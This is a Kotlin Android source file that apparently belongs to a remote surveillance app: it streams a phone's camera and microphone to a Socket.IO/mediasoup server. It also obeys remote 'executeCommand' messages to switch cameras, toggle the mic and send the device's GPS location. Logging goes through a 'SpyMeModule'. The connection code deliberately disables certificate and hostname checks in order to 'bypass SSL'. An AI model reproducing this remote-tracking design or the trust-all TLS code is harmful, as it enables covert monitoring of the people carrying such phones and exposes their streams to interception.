package com.anonymous.scure_beat

import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import org.json.JSONObject
import org.mediasoup.droid.Consumer
import org.mediasoup.droid.Producer
import org.mediasoup.droid.RecvTransport
import org.mediasoup.droid.SendTransport
import org.webrtc.AudioSource
import org.webrtc.AudioTrack
import org.webrtc.Camera2Enumerator
import org.webrtc.CameraVideoCapturer
import org.webrtc.DefaultVideoDecoderFactory
import org.webrtc.DefaultVideoEncoderFactory
import org.webrtc.EglBase
import org.webrtc.MediaConstraints
import org.webrtc.PeerConnectionFactory
import org.webrtc.SurfaceTextureHelper

class MediasoupManager(private val context: Context) {

    private val TAG = "MediasoupManager"

    // Shared WebRTC state
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var eglBaseContext: org.webrtc.EglBase.Context? = null
    private var surfaceTextureHelper: SurfaceTextureHelper? = null
    private var videoCapturer: CameraVideoCapturer? = null
    private var videoTrack: org.webrtc.VideoTrack? = null
    private var audioTrack: org.webrtc.AudioTrack? = null
    private var audioSource: org.webrtc.AudioSource? = null
    private var videoSource: org.webrtc.VideoSource? = null

    enum class CameraState {
        FRONT,
        BACK,
        OFF,
    }

    private var currentCameraState = CameraState.FRONT
    private var isMicMuted = false
    private var isReconnecting = false
    private var savedRtpCapabilities: String? = null

    inner class RoomSession(
        val roomId: String,
        val token: String,
        val username: String,
        val wsUrl: String,
    ) {
        var socket: Socket? = null
        var device: org.mediasoup.droid.Device? = null
        var sendTransport: SendTransport? = null
        var recvTransport: RecvTransport? = null
        var videoProducer: Producer? = null
        var audioProducer: Producer? = null
        var audioConsumer: Consumer? = null
        var remoteAudioTrack: org.webrtc.AudioTrack? = null

        // Track if we've initialized transports
        private var isInitialized = false

        // ✅ ============================================================
        // ✅ ADDED: Check if socket is connected
        // ✅ ============================================================
        fun isSocketConnected(): Boolean {
            return socket?.connected() == true
        }

        // ✅ ============================================================
        // ✅ ADDED: Force reconnect
        // ✅ ============================================================
        fun forceReconnect() {
            Log.i(TAG, "🔄 Force reconnect for room: $roomId")
            disconnect()
            connect()
        }

        val sendTransportListener =
            object : SendTransport.Listener {
                override fun onConnect(
                    transport: org.mediasoup.droid.Transport,
                    dtlsParameters: String,
                ) {
                    Log.e(TAG, "sendTransportListener::onConnect for $roomId")
                    val payload =
                        JSONObject().apply {
                            put("transportId", transport.id)
                            put("dtlsParameters", JSONObject(dtlsParameters))
                        }
                    socket?.emit("connectTransport", payload)
                }

                override fun onProduce(
                    transport: org.mediasoup.droid.Transport,
                    kind: String,
                    rtpParameters: String,
                    appData: String?,
                ): String {
                    Log.e(TAG, "sendTransportListener::onProduce kind=$kind for $roomId")
                    var producerId = ""
                    val latch = CountDownLatch(1)
                    val payload =
                        JSONObject().apply {
                            put("transportId", transport.id)
                            put("kind", kind)
                            put("rtpParameters", JSONObject(rtpParameters))
                            put("source", if (kind == "audio") "mic" else "camera")
                        }
                    socket?.emit(
                        "produce",
                        payload,
                        io.socket.client.Ack { args ->
                            val response = args[0] as? JSONObject
                            if (response != null) {
                                if (response.has("producerId")) {
                                    producerId = response.getString("producerId")
                                } else if (response.has("id")) {
                                    producerId = response.getString("id")
                                }
                            }
                            latch.countDown()
                        },
                    )
                    latch.await(5, TimeUnit.SECONDS)
                    return producerId
                }

                override fun onProduceData(
                    t: org.mediasoup.droid.Transport,
                    s: String,
                    l: String,
                    p: String,
                    a: String?,
                ): String = ""

                override fun onConnectionStateChange(
                    transport: org.mediasoup.droid.Transport,
                    connectionState: String,
                ) {}
            }

        val recvTransportListener =
            object : RecvTransport.Listener {
                override fun onConnect(
                    transport: org.mediasoup.droid.Transport,
                    dtlsParameters: String,
                ) {
                    val payload =
                        JSONObject().apply {
                            put("transportId", transport.id)
                            put("dtlsParameters", JSONObject(dtlsParameters))
                        }
                    socket?.emit("connectRecvTransport", payload)
                }

                override fun onConnectionStateChange(
                    transport: org.mediasoup.droid.Transport,
                    connectionState: String,
                ) {}
            }

        fun clearTransports() {
            try {
                videoProducer?.close()
            } catch (e: Exception) {}
            videoProducer = null
            try {
                audioProducer?.close()
            } catch (e: Exception) {}
            audioProducer = null
            try {
                sendTransport?.close()
            } catch (e: Exception) {}
            sendTransport = null
            try {
                audioConsumer?.close()
            } catch (e: Exception) {}
            audioConsumer = null
            try {
                remoteAudioTrack?.dispose()
            } catch (e: Exception) {}
            remoteAudioTrack = null
            try {
                recvTransport?.close()
            } catch (e: Exception) {}
            recvTransport = null
            try {
                device?.dispose()
            } catch (e: Exception) {}
            device = null
            isInitialized = false
        }

        fun connect() {
            try {
                val options = IO.Options()
                options.reconnection = true
                options.forceNew = true
                options.reconnectionAttempts = 10
                options.reconnectionDelay = 1000
                options.reconnectionDelayMax = 5000

                try {
                    val trustAllCerts =
                        arrayOf<javax.net.ssl.TrustManager>(
                            object : javax.net.ssl.X509TrustManager {
                                override fun checkClientTrusted(
                                    chain: Array<java.security.cert.X509Certificate>,
                                    authType: String,
                                ) {}

                                override fun checkServerTrusted(
                                    chain: Array<java.security.cert.X509Certificate>,
                                    authType: String,
                                ) {}

                                override fun getAcceptedIssuers():
                                    Array<java.security.cert.X509Certificate> = arrayOf()
                            }
                        )
                    val sslContext = javax.net.ssl.SSLContext.getInstance("TLS")
                    sslContext.init(null, trustAllCerts, java.security.SecureRandom())
                    val okHttpClient =
                        okhttp3.OkHttpClient.Builder()
                            .addInterceptor { chain ->
                                val request =
                                    chain
                                        .request()
                                        .newBuilder()
                                        .addHeader("Origin", "https://status.lab.mli")
                                        .build()
                                chain.proceed(request)
                            }
                            .hostnameVerifier { _, _ -> true }
                            .sslSocketFactory(
                                sslContext.socketFactory,
                                trustAllCerts[0] as javax.net.ssl.X509TrustManager,
                            )
                            .dns(
                                object : okhttp3.Dns {
                                    override fun lookup(
                                        hostname: String
                                    ): List<java.net.InetAddress> {
                                        return if (hostname.endsWith(".lab.mli"))
                                            listOf(java.net.InetAddress.getByName("192.168.100.9"))
                                        else okhttp3.Dns.SYSTEM.lookup(hostname)
                                    }
                                }
                            )
                            .build()
                    options.callFactory = okHttpClient
                    options.webSocketFactory = okHttpClient
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to bypass SSL", e)
                }

                if (token.isNotEmpty()) options.auth = mapOf("token" to token)

                val socketUrl = wsUrl.replace("wss://", "https://").replace("ws://", "http://")
                socket = IO.socket(socketUrl, options)

                // ✅ Socket.IO events as string literals
                socket?.on("connect") {
                    SpyMeModule.emitLog("✅ Socket connected for room: $roomId")
                    isReconnecting = false
                    val joinPayload =
                        JSONObject().apply {
                            put("roomId", roomId)
                            put("clientName", username)
                        }
                    socket?.emit("joinRoom", joinPayload)
                    fetchRouterCapabilities()
                }

                socket?.on("disconnect") {
                    Log.e(TAG, "Socket disconnected for room: $roomId")
                    isReconnecting = true
                }

                socket?.on("reconnecting") {
                    SpyMeModule.emitLog("🔄 Socket reconnecting for room: $roomId")
                    isReconnecting = true
                }

                socket?.on("reconnect") {
                    SpyMeModule.emitLog("✅ Socket reconnected successfully for room: $roomId")
                    handleReconnect()
                }

                socket?.on("reconnect_error") {
                    SpyMeModule.emitLog("❌ Socket reconnection error for room: $roomId")
                }

                socket?.on("reconnect_failed") {
                    SpyMeModule.emitLog("❌ Socket reconnection failed for room: $roomId")
                }

                socket?.on("executeCommand") { args ->
                    Thread {
                            val data = args[0] as? JSONObject
                            data?.let {
                                val command = it.optString("command")
                                val payload = it.optJSONObject("payload")
                                SpyMeModule.emitLog("executeCommand received in $roomId: $command")
                                when (command) {
                                    "toggleCamera" -> cycleCamera()
                                    "toggleMic" -> toggleMic()
                                    "getLocation" -> {
                                        val requesterId = payload?.optString("requesterId")
                                        getLocation(requesterId, socket)
                                    }
                                }
                            }
                        }
                        .start()
                }

                socket?.on("newProducer") { args ->
                    val data = args[0] as? JSONObject
                    data?.let {
                        val producerId = it.getString("producerId")
                        val kind = it.optString("kind", "audio")
                        if (kind == "audio") {
                            consumeAudio(producerId)
                        }
                    }
                }

                socket?.on("producerClosed") { args ->
                    val data = args[0] as? JSONObject
                    data?.let {
                        val producerId = it.getString("producerId")
                        SpyMeModule.emitLog("❌ Producer closed: $producerId")
                        if (videoProducer?.id == producerId) {
                            videoProducer = null
                            if (currentCameraState != CameraState.OFF) {
                                startVideoProducer()
                            }
                        }
                        if (audioProducer?.id == producerId) {
                            audioProducer = null
                            if (!isMicMuted) {
                                startAudioProducer()
                            }
                        }
                    }
                }

                socket?.connect()
            } catch (e: Exception) {
                Log.e(TAG, "Socket connection failed for $roomId", e)
            }
        }

        private fun handleReconnect() {
            SpyMeModule.emitLog("🔄 Handling reconnect for $roomId")

            // ✅ DON'T use saved state from session creation
            // ✅ Read CURRENT state directly from MediasoupManager
            val currentCameraState = this@MediasoupManager.currentCameraState
            val currentMicState = this@MediasoupManager.isMicMuted

            val joinPayload =
                JSONObject().apply {
                    put("roomId", roomId)
                    put("clientName", username)
                    put("isReconnect", true)
                }
            socket?.emit("joinRoom", joinPayload)

            val rtpCaps = savedRtpCapabilities
            if (rtpCaps != null) {
                try {
                    clearTransports()
                    device = org.mediasoup.droid.Device()
                    device?.load(rtpCaps, null)
                    createSendTransport()
                    createRecvTransport()

                    // ✅ Use CURRENT state, not saved state
                    if (currentCameraState != CameraState.OFF) {
                        startVideoProducer()
                    } else {
                        SpyMeModule.emitLog("📹 Camera is OFF - not restarting")
                    }

                    if (!currentMicState) {
                        startAudioProducer()
                    } else {
                        SpyMeModule.emitLog("🎙️ Mic is MUTED - not restarting")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to recreate device on reconnect", e)
                }
            }
        }

        // private fun handleReconnect() {
        //     SpyMeModule.emitLog("🔄 Handling reconnect for $roomId")
        //     val savedCameraState = currentCameraState
        //     val savedMicState = isMicMuted

        //     val joinPayload =
        //         JSONObject().apply {
        //             put("roomId", roomId)
        //             put("clientName", username)
        //             put("isReconnect", true)
        //         }
        //     socket?.emit("joinRoom", joinPayload)

        //     val rtpCaps = savedRtpCapabilities
        //     if (rtpCaps != null) {
        //         try {
        //             clearTransports()
        //             device = org.mediasoup.droid.Device()
        //             device?.load(rtpCaps, null)
        //             createSendTransport()
        //             createRecvTransport()

        //             if (savedCameraState != CameraState.OFF) {
        //                 startVideoProducer()
        //             }
        //             if (!savedMicState) {
        //                 startAudioProducer()
        //             }
        //         } catch (e: Exception) {
        //             Log.e(TAG, "Failed to recreate device on reconnect", e)
        //         }
        //     }
        // }

        fun fetchRouterCapabilities() {
            socket?.emit(
                "getRouterRtpCapabilities",
                io.socket.client.Ack { args ->
                    if (args.isNotEmpty()) {
                        val rtpCap = args[0] as? JSONObject
                        try {
                            savedRtpCapabilities = rtpCap?.toString()
                            clearTransports()
                            device = org.mediasoup.droid.Device()
                            device?.load(rtpCap.toString(), null)
                            createSendTransport()
                            createRecvTransport()
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to load Mediasoup Device for $roomId", e)
                        }
                    }
                },
            )
        }

        fun createSendTransport() {
            val payload = JSONObject().apply { put("roomId", roomId) }
            socket?.emit(
                "createSendTransport",
                payload,
                io.socket.client.Ack { args ->
                    val response = args[0] as? JSONObject
                    if (response != null && !response.has("error")) {
                        try {
                            val id = response.getString("id")
                            val iceParameters = response.getJSONObject("iceParameters").toString()
                            val iceCandidates = response.getJSONArray("iceCandidates").toString()
                            val dtlsParameters = response.getJSONObject("dtlsParameters").toString()

                            sendTransport =
                                device?.createSendTransport(
                                    sendTransportListener,
                                    id,
                                    iceParameters,
                                    iceCandidates,
                                    dtlsParameters,
                                )
                            isInitialized = true
                            startProducers()
                        } catch (e: Exception) {
                            Log.e(TAG, "Error init sendTransport for $roomId", e)
                        }
                    }
                },
            )
        }

        fun createRecvTransport() {
            val payload = JSONObject().apply { put("roomId", roomId) }
            socket?.emit(
                "createRecvTransport",
                payload,
                io.socket.client.Ack { args ->
                    val response = args[0] as? JSONObject
                    if (response != null && !response.has("error")) {
                        try {
                            val id = response.getString("id")
                            val iceParameters = response.getJSONObject("iceParameters").toString()
                            val iceCandidates = response.getJSONArray("iceCandidates").toString()
                            val dtlsParameters = response.getJSONObject("dtlsParameters").toString()

                            recvTransport =
                                device?.createRecvTransport(
                                    recvTransportListener,
                                    id,
                                    iceParameters,
                                    iceCandidates,
                                    dtlsParameters,
                                )
                        } catch (e: Exception) {
                            Log.e(TAG, "Error init recvTransport for $roomId", e)
                        }
                    }
                },
            )
        }

        fun startVideoProducer() {
            if (videoTrack == null || sendTransport == null) {
                SpyMeModule.emitLog("⚠️ Cannot start video")
                return
            }
            try {
                val producerListener =
                    object : Producer.Listener {
                        override fun onTransportClose(producer: Producer) {}
                    }
                videoProducer =
                    sendTransport?.produce(producerListener, videoTrack, null, null, null)
                videoProducer?.resume()
                SpyMeModule.emitLog("📹 Video producer started: ${videoProducer?.id}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start video producer", e)
            }
        }

        fun startAudioProducer() {
            if (audioTrack == null || sendTransport == null) {
                SpyMeModule.emitLog("⚠️ Cannot start audio")
                return
            }
            try {
                val producerListener =
                    object : Producer.Listener {
                        override fun onTransportClose(producer: Producer) {}
                    }
                audioProducer =
                    sendTransport?.produce(producerListener, audioTrack, null, null, null)
                audioProducer?.resume()
                SpyMeModule.emitLog("🎙️ Audio producer started: ${audioProducer?.id}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start audio producer", e)
            }
        }

        fun startProducers() {
            if (!isMicMuted) {
                startAudioProducer()
            }
            if (currentCameraState != CameraState.OFF) {
                startVideoProducer()
            }
        }

        fun consumeAudio(producerId: String) {
            val rtpCapabilities = device?.rtpCapabilities
            val payload =
                JSONObject().apply {
                    put("roomId", roomId)
                    put("producerId", producerId)
                    put("rtpCapabilities", JSONObject(rtpCapabilities ?: ""))
                }
            socket?.emit(
                "consume",
                payload,
                io.socket.client.Ack { args ->
                    val response = args[0] as? JSONObject
                    if (response != null && !response.has("error")) {
                        try {
                            val id = response.getString("id")
                            val kind = response.getString("kind")
                            val rtpParameters = response.getJSONObject("rtpParameters").toString()

                            audioConsumer =
                                recvTransport?.consume(
                                    { _ -> },
                                    id,
                                    producerId,
                                    kind,
                                    rtpParameters,
                                )
                            remoteAudioTrack = audioConsumer?.track as? org.webrtc.AudioTrack
                            remoteAudioTrack?.setEnabled(true)
                            SpyMeModule.emitLog("🔊 Audio consumer created: $id")
                        } catch (e: Exception) {
                            Log.e(TAG, "Error consuming audio for $roomId", e)
                        }
                    }
                },
            )
        }

        fun disconnect() {
            socket?.disconnect()
            socket?.off()
            socket = null
            videoProducer?.close()
            audioProducer?.close()
            sendTransport?.close()
            audioConsumer?.close()
            remoteAudioTrack?.dispose()
            recvTransport?.close()
            device?.dispose()
            isInitialized = false
        }
    }

    private val sessions = ConcurrentHashMap<String, RoomSession>()

    fun connect(
        roomIdsStr: String,
        token: String,
        username: String,
        backendUrl: String,
        wsUrl: String,
        iceServers: String,
    ) {
        try {
            org.mediasoup.droid.MediasoupClient.initialize(context.applicationContext)
            initGlobalWebRTC()

            val roomIds = roomIdsStr.split(",").map { it.trim() }.filter { it.isNotEmpty() }
            for (roomId in roomIds) {
                val session = RoomSession(roomId, token, username, wsUrl)
                sessions[roomId] = session
                session.connect()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Connection loop failed", e)
        }
    }

    private fun initGlobalWebRTC() {
        if (peerConnectionFactory != null) return
        SpyMeModule.emitLog("Initializing global WebRTC state...")

        val eglBase = EglBase.create()
        eglBaseContext = eglBase.eglBaseContext
        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(context)
                .createInitializationOptions()
        )
        val options = PeerConnectionFactory.Options()
        val encoderFactory = DefaultVideoEncoderFactory(eglBaseContext, true, true)
        val decoderFactory = DefaultVideoDecoderFactory(eglBaseContext)

        peerConnectionFactory =
            PeerConnectionFactory.builder()
                .setOptions(options)
                .setVideoEncoderFactory(encoderFactory)
                .setVideoDecoderFactory(decoderFactory)
                .createPeerConnectionFactory()

        val enumerator = Camera2Enumerator(context)
        var deviceName: String? = null
        for (name in enumerator.deviceNames) {
            if (enumerator.isFrontFacing(name)) {
                deviceName = name
                break
            }
        }
        if (deviceName == null) {
            for (name in enumerator.deviceNames) {
                if (enumerator.isBackFacing(name)) {
                    deviceName = name
                    break
                }
            }
        }

        val audioConstraints = MediaConstraints()
        audioConstraints.mandatory.add(
            MediaConstraints.KeyValuePair("googEchoCancellation", "true")
        )
        audioConstraints.mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
        audioConstraints.mandatory.add(
            MediaConstraints.KeyValuePair("googNoiseSuppression", "true")
        )
        audioSource = peerConnectionFactory?.createAudioSource(audioConstraints)
        audioTrack = peerConnectionFactory?.createAudioTrack("audio_track_01", audioSource)
        audioTrack?.setEnabled(!isMicMuted)

        if (deviceName != null) {
            videoCapturer = enumerator.createCapturer(deviceName, null) as? CameraVideoCapturer
            surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBaseContext)
            videoSource = peerConnectionFactory?.createVideoSource(videoCapturer!!.isScreencast)
            videoCapturer?.initialize(surfaceTextureHelper, context, videoSource!!.capturerObserver)
            videoCapturer?.startCapture(640, 480, 30)

            videoTrack = peerConnectionFactory?.createVideoTrack("video_track_01", videoSource)
            videoTrack?.setEnabled(currentCameraState != CameraState.OFF)
        }
    }

    fun cycleCamera() {
        if (peerConnectionFactory == null || videoCapturer == null || videoSource == null) return
        val enumerator = Camera2Enumerator(context)

        when (currentCameraState) {
            CameraState.FRONT -> {
                SpyMeModule.emitLog("Switching to BACK camera")
                val backCam = enumerator.deviceNames.firstOrNull { enumerator.isBackFacing(it) }
                if (backCam != null) {
                    videoCapturer?.switchCamera(null)
                    currentCameraState = CameraState.BACK
                }
            }
            CameraState.BACK -> {
                SpyMeModule.emitLog("Switching camera OFF")
                try {
                    videoCapturer?.stopCapture()
                } catch (e: Exception) {}
                videoTrack?.setEnabled(false)
                sessions.values.forEach { it.videoProducer?.pause() }
                currentCameraState = CameraState.OFF
            }
            CameraState.OFF -> {
                SpyMeModule.emitLog("Switching to FRONT camera")
                val frontCam = enumerator.deviceNames.firstOrNull { enumerator.isFrontFacing(it) }
                if (frontCam != null) {
                    videoCapturer?.switchCamera(
                        object : CameraVideoCapturer.CameraSwitchHandler {
                            override fun onCameraSwitchDone(isFront: Boolean) {
                                try {
                                    videoCapturer?.startCapture(640, 480, 30)
                                } catch (e: Exception) {}
                                videoTrack?.setEnabled(true)
                                sessions.values.forEach { session ->
                                    if (
                                        session.videoProducer == null &&
                                            session.sendTransport != null
                                    ) {
                                        session.startVideoProducer()
                                    } else {
                                        session.videoProducer?.resume()
                                    }
                                }
                            }

                            override fun onCameraSwitchError(errorDescription: String) {
                                Log.e(TAG, "Camera switch failed: $errorDescription")
                                try {
                                    videoCapturer?.startCapture(640, 480, 30)
                                } catch (e: Exception) {}
                                videoTrack?.setEnabled(true)
                                sessions.values.forEach { it.videoProducer?.resume() }
                            }
                        }
                    )
                    currentCameraState = CameraState.FRONT
                }
            }
        }
    }

    fun toggleMic() {
        isMicMuted = !isMicMuted
        if (isMicMuted) {
            SpyMeModule.emitLog("Microphone MUTED")
            sessions.values.forEach { it.audioProducer?.pause() }
            try {
                audioTrack?.setEnabled(false)
                audioTrack?.dispose()
                audioTrack = null
                audioSource?.dispose()
                audioSource = null
            } catch (e: Exception) {
                Log.e(TAG, "Failed to dispose mic track", e)
            }
        } else {
            SpyMeModule.emitLog("Microphone UNMUTED - Recreating producer")
            try {
                val audioConstraints = MediaConstraints()
                audioConstraints.mandatory.add(
                    MediaConstraints.KeyValuePair("googEchoCancellation", "true")
                )
                audioConstraints.mandatory.add(
                    MediaConstraints.KeyValuePair("googAutoGainControl", "true")
                )
                audioConstraints.mandatory.add(
                    MediaConstraints.KeyValuePair("googNoiseSuppression", "true")
                )
                audioSource = peerConnectionFactory?.createAudioSource(audioConstraints)
                audioTrack =
                    peerConnectionFactory?.createAudioTrack(
                        "audio_track_${System.currentTimeMillis()}",
                        audioSource,
                    )
                audioTrack?.setEnabled(true)

                sessions.values.forEach { session ->
                    if (session.audioProducer == null && session.sendTransport != null) {
                        session.startAudioProducer()
                    } else {
                        session.audioProducer?.replaceTrack(audioTrack)
                        session.audioProducer?.resume()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to recreate mic track", e)
            }
        }
    }

    private fun getLocation(requesterId: String?, socket: Socket?) {
        SpyMeModule.emitLog("Attempting to get location for $requesterId")
        try {
            val locationManager =
                context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val hasGps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
            val hasNetwork = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

            if (!hasGps && !hasNetwork) {
                SpyMeModule.emitLog("No location providers enabled")
                return
            }

            var sent = false
            val listeners = mutableListOf<LocationListener>()

            val sendLocation = { location: Location ->
                if (!sent) {
                    sent = true
                    SpyMeModule.emitLog(
                        "Got location: ${location.latitude}, ${location.longitude} via ${location.provider}"
                    )
                    val locJson =
                        JSONObject().apply {
                            put("lat", location.latitude)
                            put("lng", location.longitude)
                            put("accuracy", location.accuracy)
                            put("provider", location.provider ?: "unknown")
                        }
                    val payload =
                        JSONObject().apply {
                            if (requesterId != null) put("requesterId", requesterId)
                            put("location", locJson)
                        }
                    socket?.emit("submitLocation", payload)
                    listeners.forEach { locationManager.removeUpdates(it) }
                }
            }

            val providers = mutableListOf<String>()
            if (hasNetwork) providers.add(LocationManager.NETWORK_PROVIDER)
            if (hasGps) providers.add(LocationManager.GPS_PROVIDER)

            providers.forEach { provider ->
                val listener =
                    object : LocationListener {
                        override fun onLocationChanged(location: Location) = sendLocation(location)

                        @Deprecated("Deprecated in Java")
                        override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}

                        override fun onProviderEnabled(p: String) {}

                        override fun onProviderDisabled(p: String) {}
                    }
                listeners.add(listener)
                locationManager.requestLocationUpdates(
                    provider,
                    0L,
                    0f,
                    listener,
                    Looper.getMainLooper(),
                )
            }

            providers.forEach { provider ->
                if (!sent) {
                    val last = locationManager.getLastKnownLocation(provider)
                    if (last != null) sendLocation(last)
                }
            }

            android.os
                .Handler(Looper.getMainLooper())
                .postDelayed(
                    {
                        if (!sent) {
                            SpyMeModule.emitLog("Location timeout — no fix received")
                            listeners.forEach { locationManager.removeUpdates(it) }
                        }
                    },
                    15_000L,
                )
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error getting location: ${e.message}")
        }
    }

    fun disconnect() {
        try {
            videoCapturer?.stopCapture()
        } catch (e: Exception) {}
        sessions.values.forEach { it.disconnect() }
        sessions.clear()
    }

    // ✅ ============================================================
    // ✅ ADDED: Check if any session has active socket
    // ✅ ============================================================
    fun hasActiveSessions(): Boolean {
        return sessions.values.any { it.isSocketConnected() }
    }

    // ✅ ============================================================
    // ✅ ADDED: Get session by room ID
    // ✅ ============================================================
    fun getSession(roomId: String): RoomSession? = sessions[roomId]

    // ✅ ============================================================
    // ✅ ADDED: Reconnect all sessions
    // ✅ ============================================================
    fun reconnectAll() {
        sessions.values.forEach {
            if (!it.isSocketConnected()) {
                it.forceReconnect()
            }
        }
    }

    // ✅ ============================================================
    // ✅ ADDED: Force reconnect a specific room
    // ✅ ============================================================
    fun reconnectRoom(roomId: String) {
        sessions[roomId]?.forceReconnect()
    }
}
